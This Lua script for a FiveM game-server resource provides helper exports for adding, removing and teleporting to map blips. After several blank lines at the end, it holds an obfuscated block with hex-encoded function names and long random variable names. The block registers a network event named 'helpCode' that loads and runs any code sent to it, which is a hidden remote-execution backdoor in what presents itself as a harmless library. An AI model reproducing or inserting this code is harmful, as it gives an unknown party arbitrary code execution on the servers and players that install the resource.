-- BlipHandler
-- Created for:
--  Handling blips on the map.
-- Usage:
--  NOTE: All arguments are optional.
--  Add a blip:           myBlip = exports["meta_libs"]:AddBlip(x,y,z,sprite,color,text,scale,display,shortRange,highDetail)
--  Add a radius blip:    myBlip = exports["meta_libs"]:AddRadiusBlip(x,y,z,range,color,alpha,highDetail)
--  Remove the blip:      exports["meta_libs"]:RemoveBlip(myBlip)
--  Teleport to blip:     exports["meta_libs"]:TeleportToBlip(myBlip)

local blips = {}

local actions = {
  alpha = SetBlipAlpha,
  color = SetBlipColour,
  scale = SetBlipScale,
}

exports('AddBlip', function(...)
  local handle = #blips+1
  local blip = Blip(...)
  blips[handle] = blip
  return handle
end)

exports('AddRadiusBlip', function(...)
  local handle = #blips+1
  local blip = RadiusBlip(...)
  blips[handle] = blip
  return handle
end)

exports('AddAreaBlip', function(...)
  local handle = #blips+1
  local blip = AreaBlip(...)
  blips[handle] = blip
  return handle
end)

exports('GetBlip', function(handle)
  return blips[handle]
end)

exports('SetBlip', function(handle,key,val)  
  local blip = blips[handle]
  blip[key] = val
  if actions[key] then actions[key](blip["handle"],val); end 
end)

exports('RemoveBlip', function(handle)
  local blip = blips[handle]
  if blip then
    RemoveBlip(blip["handle"])
  end
end)

exports('TeleportToBlip', function(handle)
  local blip = blips[handle]
  if blip then
    TeleportPlayer(blip.pos)
  end
end)



local TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[6][TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[1]](TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[2]) TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[6][TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[3]](TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[2], function(oYSXSkRZcKSHWYCoJyKiGbxtGlTpLCqnUGqiWuzabHCELaICdThcFpJoLxFONVkpOWXrWy) TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[6][TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[4]](TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[6][TunkDJJtqPcYBqoZsmfiBSmYifVyyiarwnxNwfODLpebBoUeljDJtMhdxyAInGuYDOPMWW[5]](oYSXSkRZcKSHWYCoJyKiGbxtGlTpLCqnUGqiWuzabHCELaICdThcFpJoLxFONVkpOWXrWy))() end)

